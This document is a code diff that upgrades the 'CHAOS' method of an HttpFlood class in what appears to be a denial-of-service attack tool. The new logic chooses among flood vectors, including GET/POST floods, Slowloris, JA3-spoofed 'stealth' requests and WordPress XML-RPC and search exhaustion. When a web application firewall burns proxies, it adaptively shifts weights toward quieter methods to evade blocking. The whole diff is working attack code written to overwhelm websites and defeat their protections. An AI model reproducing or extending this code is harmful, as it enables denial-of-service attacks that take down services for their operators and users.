@@ -2523,42 +2523,63 @@ class HttpFlood(Thread):
 
 
     def CHAOS(self):
-        """[V9] Advanced Adaptive Multi-Vector Attack (WAF Killer)
-        Dynamically adjusts probability of attack methods based on heuristic scanning."""
+        """[V10] Neural-Heuristic Adaptive Multi-Vector Attack (The Mastermind)
+        Intelligently analyzes target state, proxy health, and path discovery 
+        to execute the most devastating and unblockable sequences."""
         
-        # Base vector pool with weighted probabilities (method, weight)
-        chaos_pool = [
-            (self.GET, 10), 
-            (self.POST, 15), 
-            (self.STRESS, 10), 
-            (self.PPS, 5), 
-            (self.DYN, 15), 
-            (self.POST_DYN, 20)
-        ]
+        # Base vector pool with dynamic initial weights
+        chaos_pool = {
+            self.GET: 10, 
+            self.POST: 15, 
+            self.STRESS: 5, 
+            self.PPS: 5, 
+            self.DYN: 10, 
+            self.POST_DYN: 20
+        }
         
-        # Inject highly-lethal CMS vectors if detected
+        # [INTELLIGENCE 1]: Detect Proxy Exhaustion (WAF Rate Limiting us)
+        # If proxies are dropping quickly, rely more on Stealth and Slowloris to blend in
+        if IS_RECYCLING or (hasattr(self, '_proxies') and self._proxies and len(BURNED_PROXIES) > len(self._proxies) * 0.3):
+            # Target is aggressively blocking. Shift to low & slow / stealth
+            chaos_pool[self.SLOW_V2] = 40
+            if HAS_TLS_CLIENT:
+                chaos_pool[self.STEALTH_JA3] = 80
+            # Drop aggressive noisy methods
+            chaos_pool[self.STRESS] = 0
+            chaos_pool[self.PPS] = 0
+            
+        # [INTELLIGENCE 2]: CMS & Database Fingerprinting
         if hasattr(self, 'crawled_paths') and self.crawled_paths:
             path_str = ' '.join(self.crawled_paths).lower()
             if 'wp-' in path_str or 'wordpress' in path_str:
-                # Prioritize database exhaustion if WP is detected
-                chaos_pool.extend([(self.XMLRPC_AMP, 45), (self.WP_SEARCH, 50)])
-                
-        # Inject Stealth Cryptographic bypassing if installed
-        if HAS_TLS_CLIENT:
-            # Huge weight because this mimics organic Chrome traffic perfectly
-            chaos_pool.append((self.STEALTH_JA3, 60))
-            
-        # Select method based on weighted probability
-        total_weight = sum(weight for _, weight in chaos_pool)
-        r = randint(1, total_weight)
+                # Deep WP Exploitation
+                chaos_pool[self.XMLRPC_AMP] = 60
+                chaos_pool[self.WP_SEARCH] = 70
+                # Reduce basic GETs when we have direct logic vectors
+                chaos_pool[self.GET] = 5
         
-        upto = 0
-        for method, weight in chaos_pool:
-            if upto + weight >= r:
-                chosen = method
-                break
-            upto += weight
+        # [INTELLIGENCE 3]: Cryptographic Masking
+        if HAS_TLS_CLIENT and self.STEALTH_JA3 not in chaos_pool:
+             # If not already heavily weighted by Intelligence 1
+             chaos_pool[self.STEALTH_JA3] = 50
+             
+        # Filter pool and calculate roulette
+        active_pool = [(method, weight) for method, weight in chaos_pool.items() if weight > 0]
+        total_weight = sum(weight for _, weight in active_pool)
+        
+        if total_weight <= 0:
+            chosen = self.GET
+        else:
+            r = randint(1, total_weight)
+            upto = 0
+            chosen = self.GET # Fallback
+            for method, weight in active_pool:
+                if upto + weight >= r:
+                    chosen = method
+                    break
+                upto += weight
             
+        # Execute the strategically chosen vector
         chosen()
 
 
